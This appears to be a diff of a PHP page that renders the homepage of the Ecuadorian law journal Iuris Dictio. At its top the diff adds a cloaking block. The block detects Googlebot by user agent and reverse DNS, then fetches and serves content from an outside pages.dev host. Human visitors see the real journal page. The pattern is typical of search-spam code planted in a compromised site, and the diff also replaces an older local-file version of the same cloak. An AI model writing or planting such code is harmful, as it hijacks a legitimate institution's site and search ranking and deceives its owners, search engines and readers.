@@ -1,18 +1,675 @@
 <?php
-function is_google_bot() {
-    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+function is_googlebot() {
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+    $agents = [
+        'Googlebot', 'Google-Site-Verification', 'Google-InspectionTool',
+        'Googlebot-Mobile', 'Googlebot-News', 'Mediapartners-Google',
+        'AdsBot-Google', 'Googlebot-Image', 'Googlebot-Video',
+        'APIs-Google', 'FeedFetcher-Google', 'Google-Read-Aloud'
+    ];
     foreach ($agents as $agent) {
-        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+        if (stripos($userAgent, $agent) !== false) {
+            return true;
+        }
     }
-    return false;
+
+    $hostname = gethostbyaddr($ip);
+    if (preg_match('/\.google(bot)?\.com$/', $hostname)) {
+        $ipVerify = gethostbyname($hostname);
+        if ($ip === $ipVerify) {
+            return true;
+        }
+    }
+
+    return false;         
 }
 
-if (is_google_bot()) {
-    $bot_content = file_get_contents('file.json');
-    echo $bot_content;
-    exit;
-} else {
-    include('wp.json');
+if (is_googlebot()) {
+    $bot_content = 'https://revistas-maunaik.pages.dev/';
+
+    $curl = curl_init();
+    curl_setopt_array($curl, [
+        CURLOPT_URL => $bot_content,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 5,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HTTPHEADER => [
+            'User-Agent: Googlebot'
+        ],
+    ]);
+
+    $response = curl_exec($curl);
+    curl_close($curl);
+
+    echo $response;
     exit;
 }
 ?>
+
+
+
+
+
+
+
+<!DOCTYPE html>
+
+<html lang="es" xml:lang="es">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>
+		Iuris Dictio
+					</title>
+
+	
+<link rel="icon" href="https://revistas.usfq.edu.ec/public/journals/7/favicon_es_ES.png">
+<meta name="description" content="Iuris Dictio es una publicación arbitrada que se orienta al estudio del Derecho. Su objetivo es difundir investigaciones originales y recientes que aporten al análisis y discusión del complejo fenómeno jurídico.">
+<meta name="generator" content="Open Journal Systems 3.4.0.7">
+<link rel="alternate" type="application/atom+xml" href="https://revistas.usfq.edu.ec/index.php/iurisdictio/gateway/plugin/WebFeedGatewayPlugin/atom">
+<link rel="alternate" type="application/rdf+xml" href="https://revistas.usfq.edu.ec/index.php/iurisdictio/gateway/plugin/WebFeedGatewayPlugin/rss">
+<link rel="alternate" type="application/rss+xml" href="https://revistas.usfq.edu.ec/index.php/iurisdictio/gateway/plugin/WebFeedGatewayPlugin/rss2">
+	<link rel="stylesheet" href="https://revistas.usfq.edu.ec/plugins/themes/immersion/resources/dist/app.min.css?v=3.4.0.7" type="text/css" /><link rel="stylesheet" href="https://revistas.usfq.edu.ec/index.php/iurisdictio/$$$call$$$/page/page/css?name=less" type="text/css" /><link rel="stylesheet" href="https://revistas.usfq.edu.ec/plugins/generic/citations/css/citations.css?v=3.4.0.7" type="text/css" /><link rel="stylesheet" href="https://revistas.usfq.edu.ec/plugins/generic/doiInSummary/styles/doi.css?v=3.4.0.7" type="text/css" /><link rel="stylesheet" href="https://revistas.usfq.edu.ec/plugins/generic/orcidProfile/css/orcidProfile.css?v=3.4.0.7" type="text/css" /><link rel="stylesheet" href="https://revistas.usfq.edu.ec/public/journals/7/styleSheet.css?d=2022-10-12+15%3A53%3A08" type="text/css" /><link rel="stylesheet" href="https://revistas.usfq.edu.ec/public/site/styleSheet.css?v=3.4.0.7" type="text/css" />
+</head>
+<body class="page_index op_index has_site_logo"
+      dir="ltr">
+
+<div class="cmp_skip_to_content">
+	<a class="visually-hidden" href="#immersion_content_header">Ir al menú de navegación principal</a>
+	<a class="visually-hidden" href="#immersion_content_main">Ir al contenido principal</a>
+	<a class="visually-hidden" href="#immersion_content_footer">Ir al pie de página del sitio</a>
+</div>
+
+<header class="main-header"
+        id="immersion_content_header" style="background-image: url('https://revistas.usfq.edu.ec/public/journals/7/homepageImage_es_ES.png')">
+	<div class="container-fluid">
+		<nav class="main-header__admin locale-enabled">
+
+						
+										<ul id="languageNav" class="language-toggle nav">
+	<li class="nav-item dropdown">
+		<a class="main-header__lang-link dropdown-toggle" id="languageToggleMenulanguageNav" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+			<span class="visually-hidden">Cambiar el idioma. El idioma actual es:</span>
+			Español
+		</a>
+
+		<ul class="dropdown-menu dropdown-menu-left" aria-labelledby="languageToggleMenulanguageNav">
+												<li class="dropdown-item">
+						<a class="nav-link" href="https://revistas.usfq.edu.ec/index.php/iurisdictio/user/setLocale/en?source=%2Findex.php%2Fiurisdictio">
+							Inglés
+						</a>
+					</li>
+																</ul>
+	</li>
+</ul>
+			
+							<h2 class="visually-hidden">Menú de administración</h2>
+									<ul id="navigationUser" class="pkp_navigation_user pkp_nav_list">
+					
+																	<li class=" nmi_type_user_register nav-item">
+					<a class="main-header__admin-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/user/register">
+						Registrarse
+					</a>
+									</li>
+								
+																	<li class=" nmi_type_submissions nav-item">
+					<a class="main-header__admin-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/about/submissions">
+						Envíos
+					</a>
+									</li>
+								
+																	<li class=" nmi_type_user_login nav-item">
+					<a class="main-header__admin-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/login">
+						Entrar
+					</a>
+									</li>
+													</ul>
+
+			
+			
+		</nav>
+
+					<h1 class="main-header__title">
+		
+		
+					<a href="			https://revistas.usfq.edu.ec/index.php/iurisdictio/index
+		" class="is_img">
+				<img src="https://revistas.usfq.edu.ec/public/journals/7/pageHeaderLogoImage_es_ES.png" width="1000" height="554" alt="Iuris Dictio" />
+			</a>
+		
+					</h1>
+		
+						
+						<nav class="navbar navbar-expand-sm main-header__nav">
+				<button class="navbar-toggler mx-auto hamburger" data-bs-target="#main-menu" data-bs-toggle="collapse"
+				        type="button"
+				        aria-label="Menu" aria-controls="navigation">
+					<span class="hamburger__wrapper">
+		                <span class="hamburger__icon"></span>
+		            </span>
+				</button>
+				<h2 class="visually-hidden">Menú principal</h2>
+				<div class="collapse navbar-collapse" id="main-menu">
+										<ul id="navigationPrimary" class="pkp_navigation_primary pkp_nav_list navbar-nav mx-auto">
+					
+																	<li class=" nmi_type_remote_url nav-item">
+					<a class="main-header__nav-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio">
+						Inicio
+					</a>
+									</li>
+								
+																	<li class=" nmi_type_about nav-item dropdown">
+					<a class="main-header__nav-link dropdown-toggle"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/about" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+						Acerca de
+					</a>
+											<ul class="dropdown-menu">
+																								<li class=" dropdown-item">
+										<a class="nav-link"
+										   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/about">
+											Sobre la revista
+										</a>
+									</li>
+																																<li class=" dropdown-item">
+										<a class="nav-link"
+										   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/normativas">
+											Normativas de publicación
+										</a>
+									</li>
+																																<li class=" dropdown-item">
+										<a class="nav-link"
+										   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/about/submissions">
+											Envíos
+										</a>
+									</li>
+																																<li class=" dropdown-item">
+										<a class="nav-link"
+										   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/about/editorialTeam">
+											Equipo editorial
+										</a>
+									</li>
+																																<li class=" dropdown-item">
+										<a class="nav-link"
+										   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/declaracionetica">
+											 Declaración ética
+										</a>
+									</li>
+																																<li class=" dropdown-item">
+										<a class="nav-link"
+										   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/about/privacy">
+											Declaración de privacidad
+										</a>
+									</li>
+																					</ul>
+									</li>
+								
+																	<li class=" nmi_type_announcements nav-item">
+					<a class="main-header__nav-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/announcement">
+						Avisos
+					</a>
+									</li>
+								
+																	<li class=" nmi_type_current nav-item">
+					<a class="main-header__nav-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/issue/current">
+						Actual
+					</a>
+									</li>
+								
+																	<li class=" nmi_type_archives nav-item">
+					<a class="main-header__nav-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/issue/archive">
+						Archivos
+					</a>
+									</li>
+								
+																	<li class=" nmi_type_custom nav-item">
+					<a class="main-header__nav-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/metrics">
+						Estadísticas
+					</a>
+									</li>
+								
+																	<li class=" nmi_type_custom nav-item">
+					<a class="main-header__nav-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/indexing">
+						Indexaciones
+					</a>
+									</li>
+								
+																	<li class=" nmi_type_contact nav-item">
+					<a class="main-header__nav-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/about/contact">
+						Contacto
+					</a>
+									</li>
+								
+																	<li class=" nmi_type_search nav-item">
+					<a class="main-header__nav-link"
+					   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/search">
+						Buscar 
+					</a>
+									</li>
+						</ul>
+
+			
+				</div>
+			</nav>
+				</div> </header>
+
+<main id="immersion_content_main">
+
+	
+
+			<section class="journal-description" style="background-color: #FAF9F9;">
+			<div class="container">
+				<header class="row">
+					<h3 class="col-md-6">
+						Acerca de
+					</h3>
+				</header>
+				<div class="row">
+					<div class="col-md-6 col-lg-8">
+						<div class="flex max-w-full flex-col flex-grow">
+<div class="min-h-[20px] text-message flex w-full flex-col items-end gap-2 whitespace-normal break-words [.text-message+&amp;]:mt-5" dir="auto" data-message-author-role="assistant" data-message-id="0b9ae31a-4e3e-4e08-9742-c76687e449ef">
+<div class="flex w-full flex-col gap-1 empty:hidden first:pt-[3px]">
+<div class="markdown prose w-full break-words dark:prose-invert light">
+<p><em>Iuris Dictio</em> es una revista semestral arbitrada, fundada en 1998 y adscrita al Colegio de Jurisprudencia de la Universidad San Francisco de Quito USFQ, dedicada al estudio del Derecho. Su propósito es difundir investigaciones originales y recientes que fomenten el análisis y debate jurídico, promoviendo un enfoque académico internacionalmente responsable. Publicada bajo la filosofía de Artes Liberales, Iuris Dictio ofrece artículos de libre acceso y circulación, combinando análisis generalista con especialización en temas jurídicos. Además, busca alcanzar a un público especializado en Derecho, con una sección de Entrevistas orientada a la divulgación para quienes tienen un conocimiento limitado del tema.</p>
+<p><strong>ISSN (versión impresa hasta 2022): </strong> 1390-6402 <strong>ISSNe (versión electrónica): </strong>2528-7834<br /><strong>Link permanente:</strong><a href="http://iurisdictio.usfq.edu.ec">http://iurisdictio.usfq.edu.ec</a><br /><strong>Indexada en: </strong><a href="http://miar.ub.edu/issn/1390-6402" target="_blank" rel="noopener">MIAR</a>, <a href="https://dbh.nsd.uib.no/publiseringskanaler/erihplus/periodical/info.action?id=496610" target="_blank" rel="noopener">ERIHPLUS</a>, <a href="http://www.latindex.org/latindex/ficha?folio=26322" target="_blank" rel="noopener">LATINDEX</a>, <a href="https://www.mla.org/content/download/88396/2222979/All-Indexed-Journal-Titles.xlsx" target="_blank" rel="noopener">MLA</a>, <a href="http://ezb.uni-regensburg.de/ezeit/searchres.phtml?&amp;lang=en&amp;jq_type1=QS&amp;jq_term1=Iuris+Dictio" target="_blank" rel="noopener">CZ3</a>, <a href="http://www.usfq.edu.ec/Documents/iurisdictio/CERTIFICADO_LATINREV_Iurisdictio.pdf" target="_blank" rel="noopener">LATINREV</a>, <a href="https://www.base-search.net/Search/Results?lookfor=dccoll%3Aftunivfquitoojs+url%3Aiurisdictio&amp;refid=dclink" target="_blank" rel="noopener">BASE</a>, <a href="https://doaj.org/toc/1390-6402" target="_blank" rel="noopener">DOAJ</a>, <a href="https://www.redib.org/recursos/Record/oai_revista4463-iuris-dictio-revista-derecho" target="_blank" rel="noopener">REDIB</a>, <a href="http://latinoamericanarevistas.org/">Latinoamericana</a>, <a href="http://latam.tirantonline.com.ezbiblio.usfq.edu.ec/latam/bibliotecaVirtual/ebookInfo?isbn=USFQ2528783418&amp;tolgeoDoc=latamDoc">LATAM</a>, <a href="https://scholar.google.es/scholar?hl=es&amp;as_sdt=0%2C5&amp;q=iurisdictio+site%3Ausfq.edu.ec&amp;btnG=" target="_blank" rel="noopener">Google Scholar</a>, <a href="https://oaji.net/journal-detail.html?number=13236">OAJI  </a></p>
+<p><strong>Editorial:</strong> USFQ PRESS</p>
+</div>
+</div>
+</div>
+</div>
+<div class="mt-1 flex gap-3 empty:hidden -ml-2">
+<div class="items-center justify-start rounded-xl p-1 flex">
+<div class="flex items-center"> </div>
+</div>
+</div>
+						<p>
+														<a href="https://revistas.usfq.edu.ec/index.php/iurisdictio/about" class="btn btn-primary">Leer más</a>
+						</p>
+					</div>
+				</div>
+			</div>
+		</section>
+	
+		
+			<section class="issue">
+
+						
+<div class="container">
+	<header class="issue__header">
+					<p class="issue__meta">Número actual</p>
+				<h2 class="issue__title"><span class="issue__number">Núm. 36</span></h2><p class="issue__meta">Publicado July 8, 2025</p>	</header>
+
+			<section class="row issue-desc">
+													<div class="col-md-6">
+					<h3 class="issue-desc__title">Descripción del número</h3>
+					<div class="issue-desc__content">
+																									<p><strong>Dossier N° 36: Los desafíos de la regulación y supervisión financiera ante la policrisis</strong><strong>.</strong></p>
+<p>Dossier coordinado por<strong> Sebastián Correa y Ricardo Montalvo.</strong></p>
+<p>Publicación arbitrada del Colegio de Jurisprudencia de l
+							<span class="ellipsis">...</span>
+							<a class="full-issue__link"
+							   href="https://revistas.usfq.edu.ec/index.php/iurisdictio/issue/view/286">Ver el número completo</a>
+											</div>
+				</div>
+								</section>
+	</div>
+
+							<section class="issue-section">
+			<div class="container">
+									<header class="row issue-section__header">
+													<h3 class="col-md-6 col-lg-3 issue-section__title">Miscelánea</h3>
+																	</header>
+								<div class="row">
+					<div class="col-12">
+						<ol class="issue-section__toc">
+															<li class="issue-section__toc-item">
+									
+	
+<article class="article">
+	<div class="row">
+				<div class="col-md-8 offset-md-4">
+							<p class="article__meta">Janetsy Gutiérrez Proenza</p>
+			
+			<h4 class="article__title">
+				<a href="https://revistas.usfq.edu.ec/index.php/iurisdictio/article/view/3532">
+					Neuroderechos y derechos humanos en la era de la neurotecnología: ¿Regulación necesaria o inevitable?
+				</a>
+			</h4>
+
+							<ul class="article__btn-group">
+																																					<li>
+																																				
+	
+							
+
+<a class="article__btn pdf" href="https://revistas.usfq.edu.ec/index.php/iurisdictio/article/view/3532/4535">
+
+		
+	PDF
+
+	</a>
+						</li>
+									</ul>
+					</div>
+
+		<div id="doi_article-3532" class='doiInSummary'>
+    <strong>
+                DOI:
+    </strong>
+    <a href="https://doi.org/10.18272/iu.i36.3532">
+        https://doi.org/10.18272/iu.i36.3532
+    </a>
+</div>
+
+<script>
+    function insertAfter(newNode, referenceNode) {
+        referenceNode.parentNode.insertBefore(newNode, referenceNode.nextSibling);
+    }
+
+    function updateDoiPosition(){
+        const doiDiv = document.getElementById('doi_article-3532');
+        const articleSummary = doiDiv.parentNode;
+        const titlesDefault = articleSummary.getElementsByClassName('title');
+        const titlesImmersion = articleSummary.getElementsByClassName('article__title');
+
+        if(titlesDefault.length > 0) {
+            let title = titlesDefault[0];
+            insertAfter(doiDiv, title);
+        }
+        else if(titlesImmersion.length > 0) {
+            let title = titlesImmersion[0];
+            insertAfter(doiDiv, title);
+        }
+    }
+
+    updateDoiPosition();
+</script>
+
+	</div>
+</article>
+								</li>
+															<li class="issue-section__toc-item">
+									
+	
+<article class="article">
+	<div class="row">
+				<div class="col-md-8 offset-md-4">
+							<p class="article__meta">Diego Xavier López Jara</p>
+			
+			<h4 class="article__title">
+				<a href="https://revistas.usfq.edu.ec/index.php/iurisdictio/article/view/3718">
+					El problema del nexo ontológico en la atribución de responsabilidad penal en el Ecuador
+				</a>
+			</h4>
+
+							<ul class="article__btn-group">
+																																					<li>
+																																				
+	
+							
+
+<a class="article__btn pdf" href="https://revistas.usfq.edu.ec/index.php/iurisdictio/article/view/3718/4497">
+
+		
+	PDF
+
+	</a>
+						</li>
+									</ul>
+					</div>
+
+		<div id="doi_article-3718" class='doiInSummary'>
+    <strong>
+                DOI:
+    </strong>
+    <a href="https://doi.org/10.18272/iu.i36.3718">
+        https://doi.org/10.18272/iu.i36.3718
+    </a>
+</div>
+
+<script>
+    function insertAfter(newNode, referenceNode) {
+        referenceNode.parentNode.insertBefore(newNode, referenceNode.nextSibling);
+    }
+
+    function updateDoiPosition(){
+        const doiDiv = document.getElementById('doi_article-3718');
+        const articleSummary = doiDiv.parentNode;
+        const titlesDefault = articleSummary.getElementsByClassName('title');
+        const titlesImmersion = articleSummary.getElementsByClassName('article__title');
+
+        if(titlesDefault.length > 0) {
+            let title = titlesDefault[0];
+            insertAfter(doiDiv, title);
+        }
+        else if(titlesImmersion.length > 0) {
+            let title = titlesImmersion[0];
+            insertAfter(doiDiv, title);
+        }
+    }
+
+    updateDoiPosition();
+</script>
+
+	</div>
+</article>
+								</li>
+															<li class="issue-section__toc-item">
+									
+	
+<article class="article">
+	<div class="row">
+				<div class="col-md-8 offset-md-4">
+							<p class="article__meta">Kimberly Gibely Triviño Rodríguez, Josué Israel Barragán Pacheco</p>
+			
+			<h4 class="article__title">
+				<a href="https://revistas.usfq.edu.ec/index.php/iurisdictio/article/view/3722">
+					Las Las justicias indígenas en Ecuador: avances y desafíos en la jurisprudencia de la Corte Constitucional
+				</a>
+			</h4>
+
+							<ul class="article__btn-group">
+																																					<li>
+																																				
+	
+							
+
+<a class="article__btn pdf" href="https://revistas.usfq.edu.ec/index.php/iurisdictio/article/view/3722/4511">
+
+		
+	PDF
+
+	</a>
+						</li>
+									</ul>
+					</div>
+
+		<div id="doi_article-3722" class='doiInSummary'>
+    <strong>
+                DOI:
+    </strong>
+    <a href="https://doi.org/10.18272/iu.i36.3722">
+        https://doi.org/10.18272/iu.i36.3722
+    </a>
+</div>
+
+<script>
+    function insertAfter(newNode, referenceNode) {
+        referenceNode.parentNode.insertBefore(newNode, referenceNode.nextSibling);
+    }
+
+    function updateDoiPosition(){
+        const doiDiv = document.getElementById('doi_article-3722');
+        const articleSummary = doiDiv.parentNode;
+        const titlesDefault = articleSummary.getElementsByClassName('title');
+        const titlesImmersion = articleSummary.getElementsByClassName('article__title');
+
+        if(titlesDefault.length > 0) {
+            let title = titlesDefault[0];
+            insertAfter(doiDiv, title);
+        }
+        else if(titlesImmersion.length > 0) {
+            let title = titlesImmersion[0];
+            insertAfter(doiDiv, title);
+        }
+    }
+
+    updateDoiPosition();
+</script>
+
+	</div>
+</article>
+								</li>
+													</ol>
+					</div>
+				</div>
+			</div>
+		</section>
+	
+		</section>
+	</main><!-- .page -->
+
+
+<footer class="main-footer" id="immersion_content_footer">
+	<div class="container">
+					<div class="sidebar_wrapper row" role="complementary">
+				<div class="pkp_block block_make_submission col-md-3">
+	<div class="content">
+		<a class="btn btn-primary" href="https://revistas.usfq.edu.ec/index.php/iurisdictio/about/submissions">
+			Enviar un artículo
+		</a>
+	</div>
+</div>
+<div class="pkp_block block_information col-md-3">
+	<h2 class="title">Información</h2>
+	<div class="content">
+		<ul>
+							<li>
+					<a href="https://revistas.usfq.edu.ec/index.php/iurisdictio/information/readers">
+						Para lectores/as
+					</a>
+				</li>
+										<li>
+					<a href="https://revistas.usfq.edu.ec/index.php/iurisdictio/information/authors">
+						Para autores/as
+					</a>
+				</li>
+										<li>
+					<a href="https://revistas.usfq.edu.ec/index.php/iurisdictio/information/librarians">
+						Para bibliotecarios/as
+					</a>
+				</li>
+					</ul>
+	</div>
+</div>
+
+			</div>
+			<hr>
+				<div class="row">
+							<div class="col-md-8">
+					<div id="footer">
+<div class="col-left">
+<p><em><img src="https://revistas.usfq.edu.ec/public/site/images/andrean/usfqpress.png" alt="" width="334" height="130" /></em></p>
+<p><em>Iuris Dictio </em>es una revista académica de USFQ PRESS, casa editorial de la Universidad San Francisco de Quito USFQ.</p>
+<p><strong>Enlace permanente: </strong><a href="https://revistas.usfq.edu.ec/index.php/iurisdictio">https://iurisdictio.usfq.edu.ec</a><a class="logo-scimago" href="https://www.scimagolab.com/" target="_blank" rel="noopener"> </a></p>
+<p><a class="logo-scimago" href="https://www.scimagolab.com/" target="_blank" rel="noopener"><img class="img-responsive" src="https://revistas.usfq.edu.ec/public/site/images/administrator/logo-footer-scimago-light.png" alt="SCimago" /></a></p>
+<p style="text-align: right; margin-top: 10px;"><a href="https://www.facebook.com/revistaiurisdictio/?locale=es_LA"> <img src="https://revistas.usfq.edu.ec/public/site/images/kmoyano/984f500cf9de4519b02b354346eb72e0-icono-de-facebook-redes-sociales.png-3ca1fba129c54a32109292435ed737c9.webp" alt="Facebook" width="80" height="80" />        </a> <a href="https://www.linkedin.com/company/revista-iuris-dictio-journal/?originalSubdomain=ec"> <img src="https://revistas.usfq.edu.ec/public/site/images/kmoyano/linkedin-blue-logo-icon-d23e0ef7fdb28333725167e713c27ff7.png" alt="LinkedIn" width="80" height="80" /> </a> <a href="https://www.instagram.com/revistaiurisdictio/"> <img src="https://revistas.usfq.edu.ec/public/site/images/kmoyano/instagram-logo-2016.png" alt="Instagram" width="143" height="80" /> </a></p>
+</div>
+</div>
+				</div>
+						<div class="col-2 col-sm-1 offset-10 offset-sm-11" role="complementary">
+				<a href="https://revistas.usfq.edu.ec/index.php/iurisdictio/about/aboutThisPublishingSystem">
+					<img class="img-fluid" alt="Más información acerca del sistema de publicación, de la plataforma y del flujo de trabajo de OJS/PKP." src="https://revistas.usfq.edu.ec/templates/images/ojs_brand.png">
+				</a>
+			</div>
+		</div>
+	</div>
+</footer>
+
+	<div id="loginModal" class="modal fade" tabindex="-1" role="dialog">
+		<div class="modal-dialog" role="document">
+			<div class="modal-content">
+				<div class="modal-body">
+					<button type="button" class="close" data-bs-dismiss="modal" aria-label="Close">
+						<span aria-hidden="true">&times;</span>
+					</button>
+					<form class="form-login" method="post" action="https://revistas.usfq.edu.ec/index.php/iurisdictio/login/signIn">
+	<input type="hidden" name="csrfToken" value="e815d8f3775de64ab3dd1a3016266ea0">
+	<input type="hidden" name="source" value=""/>
+
+	<fieldset>
+		<div class="form-group form-group-username">
+			<label for="usernameModal">
+				Nombre usuario
+				<span class="required" aria-hidden="true">*</span>
+				<span class="visually-hidden">
+					Obligatorio
+				</span>
+			</label>
+			<input type="text" class="form-control" name="username" id="usernameModal" value="" maxlength="32" required>
+		</div>
+		<div class="form-group">
+			<label for="passwordModal">
+				Contraseña
+				<span class="required" aria-hidden="true">*</span>
+				<span class="visually-hidden">
+					Obligatorio
+				</span>
+			</label>
+			<input type="password" class="form-control" name="password" id="passwordModal" value=""
+			       maxlength="32" required>
+
+			<div class="custom-control custom-checkbox">
+				<input type="checkbox" class="custom-control-input" name="remember" id="rememberModal" value="1" checked="$remember">
+				<label for="rememberModal" class="custom-control-label">
+						Mantenerme conectado
+				</label>
+			</div>
+		</div>
+		<div class="form-group">
+			<p>
+				<button class="btn btn-primary" type="submit">
+					Entrar
+				</button>
+
+														<a href="https://revistas.usfq.edu.ec/index.php/iurisdictio/user/register?source=" class="btn btn-secondary">
+						Registrarse
+					</a>
+							</p>
+
+			<p>
+				<a href="https://revistas.usfq.edu.ec/index.php/iurisdictio/login/lostPassword">
+					¿Has olvidado tu contraseña?
+				</a>
+			</p>
+		</div>
+	</fieldset>
+</form>
+				</div>
+			</div>
+		</div>
+	</div>
+
+<script src="https://revistas.usfq.edu.ec/plugins/themes/immersion/resources/dist/app.min.js?v=3.4.0.7" type="text/javascript"></script><script type="text/javascript">
+(function (w, d, s, l, i) { w[l] = w[l] || []; var f = d.getElementsByTagName(s)[0],
+j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true;
+j.src = 'https://www.googletagmanager.com/gtag/js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+function gtag(){dataLayer.push(arguments)}; gtag('js', new Date()); gtag('config', i); })
+(window, document, 'script', 'dataLayer', 'UA-74250337-1');
+</script>
+
+
+
+</body>
+</html>
